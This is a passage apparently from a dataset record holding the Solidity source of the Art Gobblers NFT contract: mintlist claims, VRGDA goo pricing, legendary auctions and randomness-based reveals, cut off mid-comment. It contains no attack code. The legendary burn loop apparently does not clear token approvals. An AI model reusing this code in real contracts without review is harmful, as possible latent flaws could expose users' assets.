[
    {
        "Code": "// SPDX-License-Identifier: MIT\npragma solidity >=0.8.0;\n\n/*                                                                              **,/*,\n                                                                     *%@&%#/*,,..........,/(%&@@#*\n                                                                 %@%,..............................#@@%\n                                                              &&,.....,,...............................,/&@*\n                                                            (@*.....**............,/,.......................(@%\n                                                           &&......*,............./,.............**............&@\n                                                          @#......**.............**..............,*........,*,..,@/\n                                                         /@......,/............../,..............,*........../,..*@.\n                                                        #@,......................*.............../,..........**...#/\n                                                      ,@&,.......................................*..........,/....(@\n                                                  *@&(*...................................................../*....(@\n                                                 @(..*%@@&%#(#@@@%%%%%&&@@@@@@@@@&&#(///..........................#@\n                                                 @%/@@@&%&&&@@&%%%%%%%#(/(((/(/(/(/(/(/(/(/(%%&@@@%(/,............#&\n                                                  @@@#/**./@%%%&%#/*************./(%@@@@&(*********(@&&@@@%(.....,&@\n                                                 ,@/.//(&@@/.     .#@%/******./&&*,      ./@&********%@/**(@#@@#,..(@\n                                                 #%****%@.           %@/****./&@      ,.    %&********%@(**&@...(@#.#@\n                                                 &#**./@/  %@&&      .@#****./@*    &@@@@&  .@/******./@@((((@&....(@\n                                                 ##**./&@ ,&@@@,     #@/****./@@      @@.  .@&*******./@%****%@@@(,\n                                                 ,@/**./%@(.      .*@@/********(&@#*,,,,/&@%/*******./@@&&&@@@#\n                                                   @&/**@&/%&&&&&%/**.//////*********./************./@&******@*\n                                                     /@@@@&(////#%&@@&(**./#&@@&(//*************./&@(********#@\n                                                       .@#**.///*****************(#@@@&&&&&@@@@&%(**********./@,\n                                                       @(*****%@#*********************&@#*********************(@\n                                                       @****./@#*./@@#//***.///(%@%*****%@*********************#@\n                                                      #&****./@%************************&@**********************@%\n                                                     .@/******.//*******************./@@(************************@/\n                                                     /@**********************************************************(@,\n                                                     @#*****************************************************%@@@@@@@.\n                                                    *@/*************************************************************#@(\n                                                    @%***************************************************************./@(\n                     /@@&&&@@                     .@/*******************************************************************&@\n                    @%######%@.                   @#***************************./%&&&%(**************#%******************&#\n                    @%######&@%&@@.             ,@(***./&#********************#@&#####%@&*************&%****************./@,\n               &&*,/@%######&@@@*.*@&,         @@****./@&*******************./%@#######%@#***********./@&*****************(@\n              ((...*%@&##%@@,..........,,,,%@&@%/*****&%****************./&@#*%@#######&@*#@%*********./@&*****************(@,\n              (@#....(@%#&&,...,/...........@(*******(@(****************(@/...*%@@@@@@%*....&@@@@&@@@@@@%/%@@##(************(@.\n              ((./(((%@%#&@/,/&@/...........%&*******%@****************./@%,.................#,............/@%***************#@\n              *@@####@@%###%&@(@(...........%&*******%@****************%@,,#%/..............................#@/***************&/\n              (#.....,&&####&@..%%..........%%*****(@@#****************#@,...................................@(***************(@\n              .@@&%%&@@&####&&.............,@(***%@(**********./#%%%%%##&@&#(,...............................#@****************&.\n               &#.....(@%###&@*............%@**%@(*******(&@&%#/////////@%...................................#@***************&@\n                 #@@@@&%####&@&&&,........%@./@%*****(@@%////////////////@@@%,...............................#@**************#@\n                     @@&&&&@@(    /&@@&%%@&@@@%**./&@(///////////////////@%.................................,@(*********./%@&.\n                      (@//@%                @%***&&(//////////////////////(&@(**,,,,./(%&@@@%/*,,****,,***./@@&&&&&&&&#//%@\n                      (@//%@               (@(*#@#////////////////////////////%@@%%%&@@#////%@/***************************&&\n                      (@//%@  .,,,,/#&&&&&&@&*#@#///////////////////////////////@%//&&///////#@(***************************@&(#@@@@@&(*.\n               ,@@@@@&&@//%@,,.,,,,,.,..,,#@./@%////////////////////////////////%@**&&////////(@(**************************&#,,,,,,,,,,,,/(#&@&\n          &@%*,,,,,,,,#@//%@,,,,,,,,,,,,,,&%*#@(////////////////////////////////%@**&&/////////&@**************************#@.,,,.,,.,,&#.,,...,%@\n       (@/,,,,,,,,,,,,(@(/%@,,,,,,,,,,,,,,&%*#@(////////////////////////////////%@./%@/////////#@(*************************&%,,,(%@@@@#*,.     .,/@.\n      &%..    *&@%/,.,#@(*#@*,,.,,,,,,,,,,%@/#@(////////////////////////////////%@**#@/////////#@(*****************.//#%@@@@%%(/,...        ...,,,%&\n     ,@*.,.       ../((%&&@@@&%#((///,,,,,/@&(@(////////////////////////////////@&**#@/////////%@%###%&&&&@@@@@@%%#(**,,,,,,.         ..,,,,,,,,,,%#\n      @(,,,,,..,            ,..   ..,,,**(%%%&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%(((,,.,.,,,,,,.,..,,,,.,.,,,,.,..,.,,.,,,,,.,,,,,,,,,.*@%\n       @%,,,,,,,,,,,,,,,.,.,,,      .,.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,.,,,.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,.,.,,,,,,#@@,\n        ,@@(,.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,.,,.,,.,.,./#%&@@@@@#\n         .@#&@@@@@%*,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,/&@@@@@%&@%((((#@@.\n          .@%((((#@@@/#&@@@@&%#/*,.,..,,,,.,,,,,.,.,,,,,,,,,,,,,,,,..,.,..,,...,,,...,,,,,,.,,,,,,,,,,,../#%&@@@@@@@&%((///*********./(((/&&\n             %@&%%#/***********./////(((((((####%%&&@@@@@@@@@@@@@@&@@@@@@@@@@@@@@@@&&%%%%%%%%#((((((((%@&#(((((#%@%/*******************./*/\n\nimport {Owned} from \"solmate/auth/Owned.sol\";\nimport {ERC721} from \"solmate/tokens/ERC721.sol\";\nimport {LibString} from \"solmate/utils/LibString.sol\";\nimport {MerkleProofLib} from \"solmate/utils/MerkleProofLib.sol\";\nimport {FixedPointMathLib} from \"solmate/utils/FixedPointMathLib.sol\";\nimport {ERC1155, ERC1155TokenReceiver} from \"solmate/tokens/ERC1155.sol\";\nimport {toWadUnsafe, toDaysWadUnsafe} from \"solmate/utils/SignedWadMath.sol\";\n\nimport {LibGOO} from \"goo-issuance/LibGOO.sol\";\nimport {LogisticVRGDA} from \"VRGDAs/LogisticVRGDA.sol\";\n\nimport {RandProvider} from \"./utils/rand/RandProvider.sol\";\nimport {GobblersERC721} from \"./utils/token/GobblersERC721.sol\";\n\nimport {Goo} from \"./Goo.sol\";\nimport {Pages} from \"./Pages.sol\";\n\n/// @title Art Gobblers NFT\n/// @author FrankieIsLost <frankie@paradigm.xyz>\n/// @author transmissions11 <t11s@paradigm.xyz>\n/// @notice An experimental decentralized art factory by Justin Roiland and Paradigm.\ncontract ArtGobblers is GobblersERC721, LogisticVRGDA, Owned, ERC1155TokenReceiver {\n    using LibString for uint256;\n    using FixedPointMathLib for uint256;\n\n    /*//////////////////////////////////////////////////////////////\n                                ADDRESSES\n    //////////////////////////////////////////////////////////////*/\n\n    /// @notice The address of the Goo ERC20 token contract.\n    Goo public immutable goo;\n\n    /// @notice The address of the Pages ERC721 token contract.\n    Pages public immutable pages;\n\n    /// @notice The address which receives gobblers reserved for the team.\n    address public immutable team;\n\n    /// @notice The address which receives gobblers reserved for the community.\n    address public immutable community;\n\n    /// @notice The address of a randomness provider. This provider will initially be\n    /// a wrapper around Chainlink VRF v1, but can be changed in case it is fully sunset.\n    RandProvider public randProvider;\n\n    /*//////////////////////////////////////////////////////////////\n                            SUPPLY CONSTANTS\n    //////////////////////////////////////////////////////////////*/\n\n    /// @notice Maximum number of mintable gobblers.\n    uint256 public constant MAX_SUPPLY = 10000;\n\n    /// @notice Maximum amount of gobblers mintable via mintlist.\n    uint256 public constant MINTLIST_SUPPLY = 2000;\n\n    /// @notice Maximum amount of mintable legendary gobblers.\n    uint256 public constant LEGENDARY_SUPPLY = 10;\n\n    /// @notice Maximum amount of gobblers split between the reserves.\n    /// @dev Set to comprise 20% of the sum of goo mintable gobblers + reserved gobblers.\n    uint256 public constant RESERVED_SUPPLY = (MAX_SUPPLY - MINTLIST_SUPPLY - LEGENDARY_SUPPLY) / 5;\n\n    /// @notice Maximum amount of gobblers that can be minted via VRGDA.\n    // prettier-ignore\n    uint256 public constant MAX_MINTABLE = MAX_SUPPLY\n        - MINTLIST_SUPPLY\n        - LEGENDARY_SUPPLY\n        - RESERVED_SUPPLY;\n\n    /*//////////////////////////////////////////////////////////////\n                           METADATA CONSTANTS\n    //////////////////////////////////////////////////////////////*/\n\n    /// @notice URI for gobblers that have yet to be revealed.\n    string public UNREVEALED_URI;\n\n    /// @notice Base URI for minted gobblers.\n    string public BASE_URI;\n\n    /*//////////////////////////////////////////////////////////////\n                             MINTLIST STATE\n    //////////////////////////////////////////////////////////////*/\n\n    /// @notice Merkle root of mint mintlist.\n    bytes32 public immutable merkleRoot;\n\n    /// @notice Mapping to keep track of which addresses have claimed from mintlist.\n    mapping(address => bool) public hasClaimedMintlistGobbler;\n\n    /*//////////////////////////////////////////////////////////////\n                            VRGDA INPUT STATE\n    //////////////////////////////////////////////////////////////*/\n\n    /// @notice Timestamp for the start of minting.\n    uint256 public immutable mintStart;\n\n    /// @notice Number of gobblers minted from goo.\n    uint128 public numMintedFromGoo;\n\n    /*//////////////////////////////////////////////////////////////\n                         STANDARD GOBBLER STATE\n    //////////////////////////////////////////////////////////////*/\n\n    /// @notice Id of the most recently minted non legendary gobbler.\n    /// @dev Will be 0 if no non legendary gobblers have been minted yet.\n    uint128 public currentNonLegendaryId;\n\n    /// @notice The number of gobblers minted to the reserves.\n    uint256 public numMintedForReserves;\n\n    /*//////////////////////////////////////////////////////////////\n                     LEGENDARY GOBBLER AUCTION STATE\n    //////////////////////////////////////////////////////////////*/\n\n    /// @notice Initial legendary gobbler auction price.\n    uint256 public constant LEGENDARY_GOBBLER_INITIAL_START_PRICE = 69;\n\n    /// @notice The last LEGENDARY_SUPPLY ids are reserved for legendary gobblers.\n    uint256 public constant FIRST_LEGENDARY_GOBBLER_ID = MAX_SUPPLY - LEGENDARY_SUPPLY + 1;\n\n    /// @notice Legendary auctions begin each time a multiple of these many gobblers have been minted from goo.\n    /// @dev We add 1 to LEGENDARY_SUPPLY because legendary auctions begin only after the first interval.\n    uint256 public constant LEGENDARY_AUCTION_INTERVAL = MAX_MINTABLE / (LEGENDARY_SUPPLY + 1);\n\n    /// @notice Struct holding data required for legendary gobbler auctions.\n    struct LegendaryGobblerAuctionData {\n        // Start price of current legendary gobbler auction.\n        uint128 startPrice;\n        // Number of legendary gobblers sold so far.\n        uint128 numSold;\n    }\n\n    /// @notice Data about the current legendary gobbler auction.\n    LegendaryGobblerAuctionData public legendaryGobblerAuctionData;\n\n    /*//////////////////////////////////////////////////////////////\n                          GOBBLER REVEAL STATE\n    //////////////////////////////////////////////////////////////*/\n\n    /// @notice Struct holding data required for gobbler reveals.\n    struct GobblerRevealsData {\n        // Last randomness obtained from the rand provider.\n        uint64 randomSeed;\n        // Next reveal cannot happen before this timestamp.\n        uint64 nextRevealTimestamp;\n        // Id of latest gobbler which has been revealed so far.\n        uint56 lastRevealedId;\n        // Remaining gobblers to be revealed with the current seed.\n        uint56 toBeRevealed;\n        // Whether we are waiting to receive a seed from Chainlink.\n        bool waitingForSeed;\n    }\n\n    /// @notice Data about the current state of gobbler reveals.\n    GobblerRevealsData public gobblerRevealsData;\n\n    /*//////////////////////////////////////////////////////////////\n                            GOBBLED ART STATE\n    //////////////////////////////////////////////////////////////*/\n\n    /// @notice Maps gobbler ids to NFT contracts and their ids to the # of those NFT ids gobbled by the gobbler.\n    mapping(uint256 => mapping(address => mapping(uint256 => uint256))) public getCopiesOfArtGobbledByGobbler;\n\n    /*//////////////////////////////////////////////////////////////\n                                 EVENTS\n    //////////////////////////////////////////////////////////////*/\n\n    event GooBalanceUpdated(address indexed user, uint256 newGooBalance);\n\n    event GobblerClaimed(address indexed user, uint256 indexed gobblerId);\n    event GobblerPurchased(address indexed user, uint256 indexed gobblerId, uint256 price);\n    event LegendaryGobblerMinted(address indexed user, uint256 indexed gobblerId, uint256[] burnedGobblerIds);\n    event ReservedGobblersMinted(address indexed user, uint256 lastMintedGobblerId, uint256 numGobblersEach);\n\n    event RandomnessFulfilled(uint256 randomness);\n    event RandomnessRequested(address indexed user, uint256 toBeRevealed);\n    event RandProviderUpgraded(address indexed user, RandProvider indexed newRandProvider);\n\n    event GobblersRevealed(address indexed user, uint256 numGobblers, uint256 lastRevealedId);\n\n    event ArtGobbled(address indexed user, uint256 indexed gobblerId, address indexed nft, uint256 id);\n\n    /*//////////////////////////////////////////////////////////////\n                                 ERRORS\n    //////////////////////////////////////////////////////////////*/\n\n    error InvalidProof();\n    error AlreadyClaimed();\n    error MintStartPending();\n\n    error SeedPending();\n    error RevealsPending();\n    error RequestTooEarly();\n    error ZeroToBeRevealed();\n    error NotRandProvider();\n\n    error ReserveImbalance();\n\n    error Cannibalism();\n    error OwnerMismatch(address owner);\n\n    error NoRemainingLegendaryGobblers();\n    error CannotBurnLegendary(uint256 gobblerId);\n    error InsufficientGobblerAmount(uint256 cost);\n    error LegendaryAuctionNotStarted(uint256 gobblersLeft);\n\n    error PriceExceededMax(uint256 currentPrice);\n\n    error NotEnoughRemainingToBeRevealed(uint256 totalRemainingToBeRevealed);\n\n    error UnauthorizedCaller(address caller);\n\n    /*//////////////////////////////////////////////////////////////\n                               CONSTRUCTOR\n    //////////////////////////////////////////////////////////////*/\n\n    /// @notice Sets VRGDA parameters, mint config, relevant addresses, and URIs.\n    /// @param _merkleRoot Merkle root of mint mintlist.\n    /// @param _mintStart Timestamp for the start of the VRGDA mint.\n    /// @param _goo Address of the Goo contract.\n    /// @param _team Address of the team reserve.\n    /// @param _community Address of the community reserve.\n    /// @param _randProvider Address of the randomness provider.\n    /// @param _baseUri Base URI for revealed gobblers.\n    /// @param _unrevealedUri URI for unrevealed gobblers.\n    constructor(\n        // Mint config:\n        bytes32 _merkleRoot,\n        uint256 _mintStart,\n        // Addresses:\n        Goo _goo,\n        Pages _pages,\n        address _team,\n        address _community,\n        RandProvider _randProvider,\n        // URIs:\n        string memory _baseUri,\n        string memory _unrevealedUri\n    )\n        GobblersERC721(\"Art Gobblers\", \"GOBBLER\")\n        Owned(msg.sender)\n        LogisticVRGDA(\n            69.42e18, // Target price.\n            0.31e18, // Price decay percent.\n            // Max gobblers mintable via VRGDA.\n            toWadUnsafe(MAX_MINTABLE),\n            0.0023e18 // Time scale.\n        )\n    {\n        mintStart = _mintStart;\n        merkleRoot = _merkleRoot;\n\n        goo = _goo;\n        pages = _pages;\n        team = _team;\n        community = _community;\n        randProvider = _randProvider;\n\n        BASE_URI = _baseUri;\n        UNREVEALED_URI = _unrevealedUri;\n\n        // Set the starting price for the first legendary gobbler auction.\n        legendaryGobblerAuctionData.startPrice = uint128(LEGENDARY_GOBBLER_INITIAL_START_PRICE);\n\n        // Reveal for initial mint must wait a day from the start of the mint.\n        gobblerRevealsData.nextRevealTimestamp = uint64(_mintStart + 1 days);\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                          MINTLIST CLAIM LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n    /// @notice Claim from mintlist, using a merkle proof.\n    /// @dev Function does not directly enforce the MINTLIST_SUPPLY limit for gas efficiency. The\n    /// limit is enforced during the creation of the merkle proof, which will be shared publicly.\n    /// @param proof Merkle proof to verify the sender is mintlisted.\n    /// @return gobblerId The id of the gobbler that was claimed.\n    function claimGobbler(bytes32[] calldata proof) external returns (uint256 gobblerId) {\n        // If minting has not yet begun, revert.\n        if (mintStart > block.timestamp) revert MintStartPending();\n\n        // If the user has already claimed, revert.\n        if (hasClaimedMintlistGobbler[msg.sender]) revert AlreadyClaimed();\n\n        // If the user's proof is invalid, revert.\n        if (!MerkleProofLib.verify(proof, merkleRoot, keccak256(abi.encodePacked(msg.sender)))) revert InvalidProof();\n\n        hasClaimedMintlistGobbler[msg.sender] = true;\n\n        unchecked {\n            // Overflow should be impossible due to supply cap of 10,000.\n            emit GobblerClaimed(msg.sender, gobblerId = ++currentNonLegendaryId);\n        }\n\n        _mint(msg.sender, gobblerId);\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                              MINTING LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n    /// @notice Mint a gobbler, paying with goo.\n    /// @param maxPrice Maximum price to pay to mint the gobbler.\n    /// @param useVirtualBalance Whether the cost is paid from the\n    /// user's virtual goo balance, or from their ERC20 goo balance.\n    /// @return gobblerId The id of the gobbler that was minted.\n    function mintFromGoo(uint256 maxPrice, bool useVirtualBalance) external returns (uint256 gobblerId) {\n        // No need to check if we're at MAX_MINTABLE,\n        // gobblerPrice() will revert once we reach it due to its\n        // logistic nature. It will also revert prior to the mint start.\n        uint256 currentPrice = gobblerPrice();\n\n        // If the current price is above the user's specified max, revert.\n        if (currentPrice > maxPrice) revert PriceExceededMax(currentPrice);\n\n        // Decrement the user's goo balance by the current\n        // price, either from virtual balance or ERC20 balance.\n        useVirtualBalance\n            ? updateUserGooBalance(msg.sender, currentPrice, GooBalanceUpdateType.DECREASE)\n            : goo.burnForGobblers(msg.sender, currentPrice);\n\n        unchecked {\n            ++numMintedFromGoo; // Overflow should be impossible due to the supply cap.\n\n            emit GobblerPurchased(msg.sender, gobblerId = ++currentNonLegendaryId, currentPrice);\n        }\n\n        _mint(msg.sender, gobblerId);\n    }\n\n    /// @notice Gobbler pricing in terms of goo.\n    /// @dev Will revert if called before minting starts\n    /// or after all gobblers have been minted via VRGDA.\n    /// @return Current price of a gobbler in terms of goo.\n    function gobblerPrice() public view returns (uint256) {\n        // We need checked math here to cause underflow\n        // before minting has begun, preventing mints.\n        uint256 timeSinceStart = block.timestamp - mintStart;\n\n        return getVRGDAPrice(toDaysWadUnsafe(timeSinceStart), numMintedFromGoo);\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                     LEGENDARY GOBBLER AUCTION LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n    /// @notice Mint a legendary gobbler by burning multiple standard gobblers.\n    /// @param gobblerIds The ids of the standard gobblers to burn.\n    /// @return gobblerId The id of the legendary gobbler that was minted.\n    function mintLegendaryGobbler(uint256[] calldata gobblerIds) external returns (uint256 gobblerId) {\n        gobblerId = FIRST_LEGENDARY_GOBBLER_ID + legendaryGobblerAuctionData.numSold; // Assign id.\n\n        // If the gobbler id would be greater than the max supply, there are no remaining legendaries.\n        if (gobblerId > MAX_SUPPLY) revert NoRemainingLegendaryGobblers();\n\n        // This will revert if the auction hasn't started yet, no need to check here as well.\n        uint256 cost = legendaryGobblerPrice();\n\n        if (gobblerIds.length < cost) revert InsufficientGobblerAmount(cost);\n\n        // Overflow should not occur in here, as most math is on emission multiples, which are inherently small.\n        unchecked {\n            uint256 burnedMultipleTotal; // The legendary's emissionMultiple will be 2x the sum of the gobblers burned.\n\n            /*//////////////////////////////////////////////////////////////\n                                    BATCH BURN LOGIC\n            //////////////////////////////////////////////////////////////*/\n\n            uint256 id; // Storing outside the loop saves ~7 gas per iteration.\n\n            for (uint256 i = 0; i < cost; ++i) {\n                id = gobblerIds[i];\n\n                if (id >= FIRST_LEGENDARY_GOBBLER_ID) revert CannotBurnLegendary(id);\n\n                require(getGobblerData[id].owner == msg.sender, \"WRONG_FROM\");\n\n                burnedMultipleTotal += getGobblerData[id].emissionMultiple;\n\n                emit Transfer(msg.sender, getGobblerData[id].owner = address(0), id);\n            }\n\n            /*//////////////////////////////////////////////////////////////\n                                 LEGENDARY MINTING LOGIC\n            //////////////////////////////////////////////////////////////*/\n\n            // The legendary's emissionMultiple is 2x the sum of the multiples of the gobblers burned.\n            getGobblerData[gobblerId].emissionMultiple = uint32(burnedMultipleTotal * 2);\n\n            // Update the user's user data struct in one big batch. We add burnedMultipleTotal to their\n            // emission multiple (not burnedMultipleTotal * 2) to account for the standard gobblers that\n            // were burned and hence should have their multiples subtracted from the user's total multiple.\n            getUserData[msg.sender].lastBalance = uint128(gooBalance(msg.sender)); // Checkpoint balance.\n            getUserData[msg.sender].lastTimestamp = uint64(block.timestamp); // Store time alongside it.\n            getUserData[msg.sender].emissionMultiple += uint32(burnedMultipleTotal); // Update multiple.\n            // We subtract the amount of gobblers burned, and then add 1 to factor in the new legendary.\n            getUserData[msg.sender].gobblersOwned = uint32(getUserData[msg.sender].gobblersOwned - cost + 1);\n\n            // New start price is the max of LEGENDARY_GOBBLER_INITIAL_START_PRICE and cost * 2.\n            legendaryGobblerAuctionData.startPrice = uint120(\n                cost <= LEGENDARY_GOBBLER_INITIAL_START_PRICE / 2 ? LEGENDARY_GOBBLER_INITIAL_START_PRICE : cost * 2\n            );\n            legendaryGobblerAuctionData.numSold += 1; // Increment the # of legendaries sold.\n\n            // If gobblerIds has 1,000 elements this should cost around ~270,000 gas.\n            emit LegendaryGobblerMinted(msg.sender, gobblerId, gobblerIds[:cost]);\n\n            _mint(msg.sender, gobblerId);\n        }\n    }\n\n    /// @notice Calculate the legendary gobbler price in terms of gobblers, according to a linear decay function.\n    /// @dev The price of a legendary gobbler decays as gobblers are minted. The first legendary auction begins when\n    /// 1 LEGENDARY_AUCTION_INTERVAL worth of gobblers are minted, and the price decays linearly while the next interval of\n    /// gobblers are minted. Every time an additional interval is minted, a new auction begins until all legendaries have been sold.\n    /// @return price of legendary gobbler, in terms of gobblers.\n    function legendaryGobblerPrice() public view returns (uint256) {\n        // Retrieve and cache various auction parameters and variables.\n        uint256 startPrice = legendaryGobblerAuctionData.startPrice;\n        uint256 numSold = legendaryGobblerAuctionData.numSold;\n        uint256 mintedFromGoo = numMintedFromGoo;\n\n        unchecked {\n            // The number of gobblers minted at the start of the auction is computed by multiplying the # of\n            // intervals that must pass before the next auction begins by the number of gobblers in each interval.\n            uint256 numMintedAtStart = (numSold + 1) * LEGENDARY_AUCTION_INTERVAL;\n\n            // If not enough gobblers have been minted to start the auction yet, return how many need to be minted.\n            if (numMintedAtStart > mintedFromGoo) revert LegendaryAuctionNotStarted(numMintedAtStart - mintedFromGoo);\n\n            // Compute how many gobblers were minted since the auction began.\n            uint256 numMintedSinceStart = numMintedFromGoo - numMintedAtStart;\n\n            // prettier-ignore\n            // If we've minted the full interval or beyond it, the price has decayed to 0.\n            if (numMintedSinceStart >= LEGENDARY_AUCTION_INTERVAL) return 0;\n            // Otherwise decay the price linearly based on what fraction of the interval has been minted.\n            else return FixedPointMathLib.unsafeDivUp(startPrice * (LEGENDARY_AUCTION_INTERVAL - numMintedSinceStart), LEGENDARY_AUCTION_INTERVAL);\n        }\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                            RANDOMNESS LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n    /// @notice Request a new random seed for revealing gobblers.\n    /// @dev Can only be called every 24 hours at the earliest.\n    function requestRandomSeed() external returns (bytes32) {\n        uint256 nextRevealTimestamp = gobblerRevealsData.nextRevealTimestamp;\n\n        // A new random seed cannot be requested before the next reveal timestamp.\n        if (block.timestamp < nextRevealTimestamp) revert RequestTooEarly();\n\n        // A random seed can only be requested when all gobblers from the previous seed have been revealed.\n        // This prevents a user from requesting additional randomness in hopes of a more favorable outcome.\n        if (gobblerRevealsData.toBeRevealed != 0) revert RevealsPending();\n\n        unchecked {\n            // Prevent revealing while we wait for the seed.\n            gobblerRevealsData.waitingForSeed = true;\n\n            // Compute the number of gobblers to be revealed with the seed.\n            uint256 toBeRevealed = currentNonLegendaryId - gobblerRevealsData.lastRevealedId;\n\n            // Ensure that there are more than 0 gobblers to be revealed,\n            // otherwise the contract could waste LINK revealing nothing.\n            if (toBeRevealed == 0) revert ZeroToBeRevealed();\n\n            // Lock in the number of gobblers to be revealed from seed.\n            gobblerRevealsData.toBeRevealed = uint56(toBeRevealed);\n\n            // We want at most one batch of reveals every 24 hours.\n            // Timestamp overflow is impossible on human timescales.\n            gobblerRevealsData.nextRevealTimestamp = uint64(nextRevealTimestamp + 1 days);\n\n            emit RandomnessRequested(msg.sender, toBeRevealed);\n        }\n\n        // Call out to the randomness provider.\n        return randProvider.requestRandomBytes();\n    }\n\n    /// @notice Callback from rand provider. Sets randomSeed. Can only be called by the rand provider.\n    /// @param randomness The 256 bits of verifiable randomness provided by the rand provider.\n    function acceptRandomSeed(bytes32, uint256 randomness) external {\n        // The caller must be the randomness provider, revert in the case it's not.\n        if (msg.sender != address(randProvider)) revert NotRandProvider();\n\n        // The unchecked cast to uint64 is equivalent to moduloing the randomness by 2**64.\n        gobblerRevealsData.randomSeed = uint64(randomness); // 64 bits of randomness is plenty.\n\n        gobblerRevealsData.waitingForSeed = false; // We have the seed now, open up reveals.\n\n        emit RandomnessFulfilled(randomness);\n    }\n\n    /// @notice Upgrade the rand provider contract. Useful if current VRF is sunset.\n    /// @param newRandProvider The new randomness provider contract address.\n    function upgradeRandProvider(RandProvider newRandProvider) external onlyOwner {\n        // Revert if waiting for seed, so we don't interrupt requests in flight.\n        if (gobblerRevealsData.waitingForSeed) revert SeedPending();\n\n        randProvider = newRandProvider; // Update the randomness provider.\n\n        emit RandProviderUpgraded(msg.sender, newRandProvider);\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                          GOBBLER REVEAL LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n    /// @notice Knuth shuffle to progressively reveal\n    /// new gobblers using entropy from a random seed.\n    /// @param numGobblers The number of gobblers to reveal.\n    function revealGobblers(uint256 numGobblers) external {\n        uint256 randomSeed = gobblerRevealsData.randomSeed;\n\n        uint256 lastRevealedId = gobblerRevealsData.lastRevealedId;\n\n        uint256 totalRemainingToBeRevealed = gobblerRevealsData.toBeRevealed;\n\n        // Can't reveal if we're still waiting for a new seed.\n        if (gobblerRevealsData.waitingForSeed) revert SeedPending();\n\n        // Can't reveal more gobblers than are currently remaining to be revealed with the seed.\n        if (numGobblers > totalRemainingToBeRevealed) revert NotEnoughRemainingToBeRevealed(totalRemainingToBeRevealed);\n\n        // Implements a Knuth shuffle. If something in\n        // here can overflow, we've got bigger problems.\n        unchecked {\n            for (uint256 i = 0; i < numGobblers; ++i) {\n                /*//////////////////////////////////////////////////////////////\n                                      DETERMINE RANDOM SWAP\n                //////////////////////////////////////////////////////////////*/\n\n                // Number of ids that have not been revealed. Subtract 1\n                // because we don't want to include any legendaries in the swap.\n                uint256 remainingIds = FIRST_LEGENDARY_GOBBLER_ID - lastRevealedId - 1;\n\n                // Randomly pick distance for swap.\n                uint256 distance = randomSeed % remainingIds;\n\n                // Current id is consecutive to last reveal.\n                uint256 currentId = ++lastRevealedId;\n\n                // Select swap id, adding distance to next reveal id.\n                uint256 swapId = currentId + distance;\n\n                /*//////////////////////////////////////////////////////////////\n                                       GET INDICES FOR IDS\n                //////////////////////////////////////////////////////////////*/\n\n                // Get the index of the swap id.\n                uint64 swapIndex = getGobblerData[swapId].idx == 0\n                    ? uint64(swapId) // Hasn't been shuffled before.\n                    : getGobblerData[swapId].idx; // Shuffled before.\n\n                // Get the owner of the current id.\n                address currentIdOwner = getGobblerData[currentId].owner;\n\n                // Get the index of the current id.\n                uint64 currentIndex = getGobblerData[currentId].idx == 0\n                    ? uint64(currentId) // Hasn't been shuffled before.\n                    : getGobblerData[currentId].idx; // Shuffled before.\n\n                /*//////////////////////////////////////////////////////////////\n                                  SWAP INDICES AND SET MULTIPLE\n                //////////////////////////////////////////////////////////////*/\n\n                // Determine the current id's new emission multiple.\n                uint256 newCurrentIdMultiple = 9; // For beyond 7963.\n\n                // The branchless expression below is equivalent to:\n                //      if (swapIndex <= 3054) newCurrentIdMultiple = 6;\n                // else if (swapIndex <= 5672) newCurrentIdMultiple = 7;\n                // else if (swapIndex <= 7963) newCurrentIdMultiple = 8;\n                assembly {\n                    // prettier-ignore\n                    newCurrentIdMultiple := sub(sub(sub(\n                        newCurrentIdMultiple,\n                        lt(swapIndex, 7964)),\n                        lt(swapIndex, 5673)),\n                        lt(swapIndex, 3055)\n                    )\n                }\n\n                // Swap the index and multiple of the current id.\n                getGobblerData[currentId].idx = swapIndex;\n                getGobblerData[currentId].emissionMultiple = uint32(newCurrentIdMultiple);\n\n                // Swap the index of the swap id.\n                getGobblerData[swapId].idx = currentIndex;\n\n                /*//////////////////////////////////////////////////////////////\n                                   UPDATE CURRENT ID MULTIPLE\n                //////////////////////////////////////////////////////////////*/\n\n                // Update the user data for the owner of the current id.\n                getUserData[currentIdOwner].lastBalance = uint128(gooBalance(currentIdOwner));\n                getUserData[currentIdOwner].lastTimestamp = uint64(block.timestamp);\n                getUserData[currentIdOwner].emissionMultiple += uint32(newCurrentIdMultiple);\n\n                // Update the random seed to choose a new distance for the next iteration.\n                // It is critical that we cast to uint64 here, as otherwise the random seed\n                // set after calling revealGobblers(1) thrice would differ from the seed set\n                // after calling revealGobblers(3) a single time. This would enable an attacker\n                // to choose from a number of different seeds and use whichever is most favorable.\n                // Equivalent to randomSeed = uint64(uint256(keccak256(abi.encodePacked(randomSeed))))\n                assembly {\n                    mstore(0, randomSeed) // Store the random seed in scratch space.\n\n                    // Moduloing by 1 << 64 (2 ** 64) is equivalent to a uint64 cast.\n                    randomSeed := mod(keccak256(0, 32), shl(64, 1))\n                }\n            }\n\n            // Update all relevant reveal state.\n            gobblerRevealsData.randomSeed = uint64(randomSeed);\n            gobblerRevealsData.lastRevealedId = uint56(lastRevealedId);\n            gobblerRevealsData.toBeRevealed = uint56(totalRemainingToBeRevealed - numGobblers);\n\n            emit GobblersRevealed(msg.sender, numGobblers, lastRevealedId);\n        }\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                                URI LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n    /// @notice Returns a token's URI if it has been 